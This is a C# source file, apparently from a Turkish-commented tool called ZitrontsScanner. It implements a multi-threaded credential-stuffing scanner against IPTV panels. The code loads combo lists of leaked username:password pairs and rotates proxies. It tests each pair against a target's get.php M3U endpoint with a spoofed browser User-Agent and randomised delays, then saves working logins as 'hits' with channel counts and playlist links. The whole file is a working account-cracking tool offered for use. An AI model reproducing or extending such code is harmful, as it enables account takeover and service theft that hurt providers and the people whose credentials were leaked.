﻿using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Threading;
using System.Net.Http;
using System.IO;
using ZitrontsScanner.Models;

namespace ZitrontsScanner.Services
{
    public class ScannerService
    {
        // EVENTS
        public event EventHandler<ScanProgressEventArgs> ProgressChanged;
        public event EventHandler<HitFoundEventArgs> HitFound;
        public event EventHandler<BotStatusEventArgs> BotStatusChanged;
        public event EventHandler<string> LogMessage;

        // SETTINGS
        private ScanConfig _config;
        private List<ProxyInfo> _proxies;
        private List<Credential> _credentials;
        private bool _isRunning;
        private int _totalLines;
        private int _checkedLines;
        private int _successfulHits;
        private DateTime _startTime;
        private readonly HttpClient _httpClient;
        private readonly Random _random;
        private readonly object _lockObject = new object();
        private int _currentLineIndex;

        // STATISTICS
        private ScanStatistics _statistics;

        public ScannerService()
        {
            _httpClient = new HttpClient();
            _httpClient.Timeout = TimeSpan.FromSeconds(30);
            _random = new Random();
            _proxies = new List<ProxyInfo>();
            _credentials = new List<Credential>();
            _statistics = new ScanStatistics();

            // Hits klasörünü oluştur
            string hitsDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Hits");
            if (!Directory.Exists(hitsDir))
                Directory.CreateDirectory(hitsDir);
        }

        // ========== PUBLIC METHODS ==========

        public async Task StartScanAsync(ScanConfig config)
        {
            if (_isRunning)
                throw new InvalidOperationException("Tarama zaten çalışıyor!");

            _config = config;
            _isRunning = true;
            _startTime = DateTime.Now;
            _checkedLines = 0;
            _successfulHits = 0;
            _currentLineIndex = _config.StartLine;

            // Initialize
            await InitializeAsync();

            // Start scanning in background
            await Task.Run(() => ScanLoopAsync());
        }

        public void StopScan()
        {
            _isRunning = false;
            OnLogMessage("🛑 Tarama durduruldu");
        }

        public void PauseScan()
        {
            // TODO: Implement pause functionality
            OnLogMessage("⏸️ Tarama duraklatıldı");
        }

        public void ResumeScan()
        {
            // TODO: Implement resume functionality
            OnLogMessage("▶️ Tarama devam ediyor");
        }

        public ScanStatistics GetCurrentStatistics()
        {
            UpdateStatistics();
            return _statistics;
        }

        // ========== PRIVATE METHODS ==========

        private async Task InitializeAsync()
        {
            OnLogMessage("🚀 Tarama başlatılıyor...");

            // 1. Combo dosyasını yükle
            LoadComboFile();

            // 2. Proxy listesini yükle (eğer kullanılıyorsa)
            if (_config.UseProxy)
                LoadProxies();

            // 3. HTTP Client'ı ayarla
            ConfigureHttpClient();

            OnLogMessage($"✅ Başlangıç tamamlandı. Toplam {_totalLines} satır yüklendi.");
        }

        private void LoadComboFile()
        {
            try
            {
                if (!File.Exists(_config.ComboFilePath))
                    throw new FileNotFoundException($"Combo dosyası bulunamadı: {_config.ComboFilePath}");

                var lines = File.ReadAllLines(_config.ComboFilePath);
                _totalLines = lines.Length;

                // Parse credentials
                for (int i = _config.StartLine; i < lines.Length; i++)
                {
                    var credential = Credential.Parse(lines[i]);
                    if (credential != null)
                        _credentials.Add(credential);
                }

                // Skip start line if specified
                if (_config.StartLine > 0)
                {
                    OnLogMessage($"📄 {_config.StartLine}. satırdan başlanıyor...");
                }

                OnLogMessage($"📊 Combo dosyası yüklendi: {_totalLines} satır, {_credentials.Count} geçerli credential");
            }
            catch (Exception ex)
            {
                OnLogMessage($"❌ Combo dosyası yükleme hatası: {ex.Message}");
                throw;
            }
        }

        private void LoadProxies()
        {
            try
            {
                if (!File.Exists(_config.ProxyFilePath))
                    throw new FileNotFoundException($"Proxy dosyası bulunamadı: {_config.ProxyFilePath}");

                var lines = File.ReadAllLines(_config.ProxyFilePath);

                foreach (var line in lines)
                {
                    if (string.IsNullOrWhiteSpace(line))
                        continue;

                    var proxy = ParseProxyLine(line);
                    if (proxy != null)
                        _proxies.Add(proxy);
                }

                OnLogMessage($"🔗 {_proxies.Count} proxy yüklendi");
            }
            catch (Exception ex)
            {
                OnLogMessage($"❌ Proxy yükleme hatası: {ex.Message}");
                throw;
            }
        }

        private ProxyInfo ParseProxyLine(string line)
        {
            try
            {
                line = line.Trim();

                // Format: ip:port, ip:port:user:pass, socks5://ip:port
                string[] parts = line.Split(':');

                if (parts.Length >= 2)
                {
                    var proxy = new ProxyInfo
                    {
                        Ip = parts[0].Trim(),      // ✅ ADDRESS YERİNE IP KULLAN
                        Port = int.Parse(parts[1].Trim()),
                        Type = _config.ProxyType,
                        IsWorking = true
                    };

                    return proxy;
                }
            }
            catch
            {
                // Invalid proxy line, skip it
            }

            return null;
        }

        private void ConfigureHttpClient()
        {
            _httpClient.DefaultRequestHeaders.Clear();
            _httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            _httpClient.DefaultRequestHeaders.Add("Accept", "application/json, text/plain, */*");
            _httpClient.DefaultRequestHeaders.Add("Accept-Language", "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7");

            if (_config.TimeoutSeconds > 0)
                _httpClient.Timeout = TimeSpan.FromSeconds(_config.TimeoutSeconds);
        }

        private async Task ScanLoopAsync()
        {
            OnLogMessage("🤖 Botlar başlatılıyor...");

            // Create bot tasks
            var botTasks = new List<Task>();
            for (int i = 0; i < _config.ThreadCount && _isRunning; i++)
            {
                int botId = i + 1;
                botTasks.Add(Task.Run(() => BotWorkerAsync(botId)));

                // Stagger bot startup
                await Task.Delay(100);
            }

            // Wait for all bots to complete
            await Task.WhenAll(botTasks);

            OnLogMessage("✅ Tarama tamamlandı!");
            _isRunning = false;
        }

        private async Task BotWorkerAsync(int botId)
        {
            string botName = $"Bot #{botId}";

            // DÜZELTİLDİ: _currentLineIndex < _credentials.Count kontrolü
            while (_isRunning && _currentLineIndex < _credentials.Count)
            {
                try
                {
                    // Get next credential
                    var credential = GetNextCredential();
                    if (credential == null)
                        break;

                    // Update bot status
                    OnBotStatusChanged(botId, credential, "🔄 Çalışıyor", "Hazırlanıyor");

                    // Test credential
                    var result = await TestCredentialAsync(credential, botId);

                    // Update statistics
                    Interlocked.Increment(ref _checkedLines);

                    if (result.IsSuccess)
                    {
                        Interlocked.Increment(ref _successfulHits);
                        OnHitFound(new ScanResult
                        {
                            Username = credential.Username,
                            Password = credential.Password,
                            TargetDNS = _config.Target,
                            FoundTime = DateTime.Now,
                            ChannelCount = result.ChannelCount,
                            Categories = result.Categories
                        });
                    }

                    // Update progress
                    UpdateStatistics();
                    OnProgressChanged();

                    // Small delay between requests
                    await Task.Delay(_random.Next(50, 200));
                }
                catch (Exception ex)
                {
                    OnLogMessage($"❌ {botName} hatası: {ex.Message}");
                }
            }

            OnBotStatusChanged(botId, null, "✅ Tamamlandı", "-");
        }

        private Credential GetNextCredential()
        {
            lock (_lockObject)
            {
                if (_currentLineIndex >= _credentials.Count)
                    return null;

                var credential = _credentials[_currentLineIndex];
                _currentLineIndex++;
                return credential;
            }
        }

        private async Task<TestResult> TestCredentialAsync(Credential credential, int botId)
        {
            string proxyAddress = GetRandomProxy();
            string proxyDisplay = proxyAddress ?? "Direct";

            try
            {
                // BOT DURUMUNU GÜNCELLE - BAŞLANGIÇ
                OnBotStatusChanged(botId, credential, "🔄 Test Ediliyor...", proxyDisplay);

                // Prepare request
                var requestUrl = BuildRequestUrl(credential);
                var request = new HttpRequestMessage(HttpMethod.Get, requestUrl);

                // Add proxy if enabled
                if (_config.UseProxy && !string.IsNullOrEmpty(proxyAddress))
                {
                    // TODO: Implement proxy support
                }

                // Send request
                var response = await _httpClient.SendAsync(request);
                var responseText = await response.Content.ReadAsStringAsync();

                // Check response
                if (response.IsSuccessStatusCode)
                {
                    // Parse M3U response
                    var channelCount = ParseChannelCount(responseText);
                    var categories = _config.GetCategories ? ParseCategories(responseText) : "";

                    // BOT DURUMUNU GÜNCELLE - BAŞARI
                    OnBotStatusChanged(botId, credential, $"✅ Başarılı ({channelCount} kanal)", proxyDisplay);

                    return new TestResult
                    {
                        IsSuccess = true,
                        ChannelCount = channelCount,
                        Categories = categories,
                        StatusCode = (int)response.StatusCode
                    };
                }
                else
                {
                    // BOT DURUMUNU GÜNCELLE - HATA
                    OnBotStatusChanged(botId, credential, $"❌ Hata ({response.StatusCode})", proxyDisplay);

                    return new TestResult
                    {
                        IsSuccess = false,
                        StatusCode = (int)response.StatusCode
                    };
                }
            }
            catch (HttpRequestException ex)
            {
                OnBotStatusChanged(botId, credential, $"❌ Network Hatası", proxyDisplay);
                OnLogMessage($"🌐 {botId}. Bot network hatası: {ex.Message}");
                return new TestResult { IsSuccess = false, StatusCode = 0 };
            }
            catch (TaskCanceledException)
            {
                OnBotStatusChanged(botId, credential, $"⏰ Timeout", proxyDisplay);
                OnLogMessage($"⏰ {botId}. Bot timeout!");
                return new TestResult { IsSuccess = false, StatusCode = 0 };
            }
            catch (Exception ex)
            {
                OnBotStatusChanged(botId, credential, $"❌ Genel Hata", proxyDisplay);
                OnLogMessage($"⚠️ {botId}. Bot genel hatası: {ex.Message}");
                return new TestResult { IsSuccess = false, StatusCode = 0 };
            }
        }

        private string BuildRequestUrl(Credential credential)
        {
            // Build M3U request URL
            string baseUrl = _config.Target;

            if (!baseUrl.Contains("http"))
                baseUrl = "http://" + baseUrl;

            // TODO: Implement proper URL building based on API type
            return $"{baseUrl}/get.php?username={credential.Username}&password={credential.Password}&type=m3u_plus";
        }

        private int ParseChannelCount(string m3uContent)
        {
            // Count #EXTINF lines in M3U
            int count = 0;
            foreach (var line in m3uContent.Split('\n'))
            {
                if (line.StartsWith("#EXTINF"))
                    count++;
            }
            return count;
        }

        private string ParseCategories(string m3uContent)
        {
            // Extract categories from M3U
            var categories = new List<string>();

            foreach (var line in m3uContent.Split('\n'))
            {
                if (line.Contains("group-title="))
                {
                    int start = line.IndexOf("group-title=\"") + 13;
                    int end = line.IndexOf("\"", start);
                    if (start > 13 && end > start)
                    {
                        string category = line.Substring(start, end - start);
                        if (!categories.Contains(category))
                            categories.Add(category);
                    }
                }
            }

            return string.Join(", ", categories);
        }

        private string GetRandomProxy()
        {
            if (_proxies.Count == 0 || !_config.UseProxy)
                return null;

            int index = _random.Next(0, _proxies.Count);
            var proxy = _proxies[index];

            return $"{proxy.Ip}:{proxy.Port}";  // ✅ ADDRESS YERİNE IP KULLAN
        }

        private void UpdateStatistics()
        {
            _statistics.TotalLines = _totalLines;
            _statistics.CheckedLines = _checkedLines;
            _statistics.SuccessfulHits = _successfulHits;
            _statistics.ActiveBots = _config.ThreadCount;
            _statistics.StartTime = _startTime;
        }

        // ========== HIT KAYDETME SİSTEMİ ==========

        private void SaveHitToFile(ScanResult result)
        {
            try
            {
                string hitsDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Hits");
                string fileName = $"hit_{DateTime.Now:yyyyMMdd_HHmmss}_{result.Username}.txt";
                string filePath = Path.Combine(hitsDir, fileName);

                string content = $"🚀 ZITRONTS SCANNER - HIT BULUNDU!\n" +
                                $"═══════════════════════════════\n" +
                                $"Kullanıcı: {result.Username}\n" +
                                $"Şifre: {result.Password}\n" +
                                $"DNS: {result.TargetDNS}\n" +
                                $"Kanal Sayısı: {result.ChannelCount}\n" +
                                $"Kategoriler: {result.Categories}\n" +
                                $"Tarih: {result.FoundTime:yyyy-MM-dd HH:mm:ss}\n" +
                                $"═══════════════════════════════\n" +
                                $"M3U Link: {result.TargetDNS}/get.php?username={result.Username}&password={result.Password}&type=m3u_plus";

                File.WriteAllText(filePath, content);
                OnLogMessage($"💾 Hit kaydedildi: {fileName}");
            }
            catch (Exception ex)
            {
                OnLogMessage($"❌ Hit kaydetme hatası: {ex.Message}");
            }
        }

        // ========== EVENT TRIGGERS ==========

        private void OnProgressChanged()
        {
            ProgressChanged?.Invoke(this, new ScanProgressEventArgs
            {
                CheckedLines = _checkedLines,
                TotalLines = _totalLines,
                SuccessfulHits = _successfulHits,
                ActiveBots = _config.ThreadCount,
                ElapsedTime = DateTime.Now - _startTime,
                CPM = CalculateCPM()
            });
        }

        private void OnHitFound(ScanResult result)
        {
            HitFound?.Invoke(this, new HitFoundEventArgs
            {
                Result = result
            });

            SaveHitToFile(result);

            // BURAYI SİL: Log ekleme MainWindow'da yapılıyor
            // OnLogMessage($"🎯 YENİ HIT: {result.Username}:{result.Password} ({result.ChannelCount} kanal)");
        }

        private void OnBotStatusChanged(int botId, Credential credential, string status, string proxy)
        {
            BotStatusChanged?.Invoke(this, new BotStatusEventArgs
            {
                BotId = botId,
                Credential = credential?.ToString() ?? "N/A",
                Status = status,
                Proxy = proxy
            });
        }

        private void OnLogMessage(string message)
        {
            LogMessage?.Invoke(this, message);
        }

        private int CalculateCPM()
        {
            var elapsedMinutes = (DateTime.Now - _startTime).TotalMinutes;
            if (elapsedMinutes == 0)
                return 0;

            return (int)(_checkedLines / elapsedMinutes);
        }
    }

    // ========== SUPPORTING CLASSES ==========

    public class TestResult
    {
        public bool IsSuccess { get; set; }
        public int StatusCode { get; set; }
        public int ChannelCount { get; set; }
        public string Categories { get; set; }
    }

    public class ScanProgressEventArgs : EventArgs
    {
        public int CheckedLines { get; set; }
        public int TotalLines { get; set; }
        public int SuccessfulHits { get; set; }
        public int ActiveBots { get; set; }
        public TimeSpan ElapsedTime { get; set; }
        public int CPM { get; set; }

        public double ProgressPercentage => TotalLines > 0 ? (double)CheckedLines / TotalLines * 100 : 0;
        public double SuccessRate => CheckedLines > 0 ? (double)SuccessfulHits / CheckedLines * 100 : 0;
    }

    public class HitFoundEventArgs : EventArgs
    {
        public ScanResult Result { get; set; }
    }

    public class BotStatusEventArgs : EventArgs
    {
        public int BotId { get; set; }
        public string Credential { get; set; }
        public string Status { get; set; }
        public string Proxy { get; set; }
    }
}